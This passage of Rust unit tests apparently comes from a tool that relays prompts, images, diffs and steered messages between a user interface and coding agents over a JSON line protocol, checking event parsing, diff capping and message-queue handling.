        let st = p.on_line(r#"{"type":"auto_retry_end","success":true,"attempt":1}"#);
        assert_eq!(st.events, [json!({"event": "status", "text": ""})]);
        assert!(p.in_turn());
    }

    #[test]
    fn pi_and_omo_get_pictures_as_the_prompt_images() {
        let mut p = Pi::new("/w/proj", "OmO");
        p.start();
        let st = p.on_input(with_pic("What does it say?")).unwrap();
        let cmd: Value = serde_json::from_str(&st.write[0]).unwrap();
        assert_eq!(s(&cmd, "type"), "prompt");
        assert_eq!(s(&cmd, "message"), "What does it say?");
        assert_eq!(cmd["images"], json!([{"type": "image", "data": "iVBORw0KGgo=", "mimeType": "image/png"}]));
        let st = p.on_input(Input::send("no picture")).unwrap();
        let cmd: Value = serde_json::from_str(&st.write[0]).unwrap();
        assert!(cmd.get("images").is_none());
    }

    #[test]
    fn diff_lines_are_capped_and_counted() {
        let big: String = (0..450).map(|i| format!("line {i}\n")).collect();
        let f = input_diff("Write", &json!({"file_path": "/w/proj/big.txt", "content": big}), "/w/proj").unwrap();
        assert_eq!(f["lines"].as_array().unwrap().len(), DIFF_LINES);
        assert_eq!((f["added"].as_u64(), f["more"].as_u64()), (Some(450), Some(50)));
        assert_eq!(s(&f, "path"), "big.txt");
        // MultiEdit: one hunk per edit; a non-file tool has none
        let m = input_diff("MultiEdit", &json!({"file_path": "/w/proj/a.ts", "edits": [{"old_string": "a", "new_string": "b"}, {"old_string": "c", "new_string": "d"}]}), "/w/proj").unwrap();
        assert_eq!(m["lines"], json!(["-a", "+b", "@@", "-c", "+d"]));
        assert!(input_diff("Bash", &json!({"command": "ls"}), "/w/proj").is_none());
        // the rpc and acp agents have no rewind; DSH neither
        assert!(Pi::new("/w/proj", "OmO").on_input(Input::Rewind).is_err());
    }

    #[test]
    fn delete_before_taken_never_reaches_the_agent_and_a_steer_waits_until_taken() {
        // a held message is manut's: deleting it writes nothing. A steered one belongs to the agent until it is
        // taken; Stop before that drops it (pi clears its queue)
        let mut p = pi_up("pi", &[]);
        p.on_input(sent_with("long", "a")).unwrap();
        run(&mut p, &[r#"{"type":"agent_start"}"#.into()]);
        p.on_input(steer("steered", "b")).unwrap();
        let st = run(&mut p, &[r#"{"type":"message_end","message":{"role":"user","content":[{"type":"text","text":"long"}]}}"#.into()]);
        assert!(of(&st.events, "message.taken").is_empty());
        let st = run(&mut p, &[r#"{"type":"agent_end","aborted":true}"#.into()]);
        assert_eq!(names(&st.events)[..2], ["message.dropped", "turn.end"]);
        assert_eq!(st.events[0]["id"], "b");
    }
}
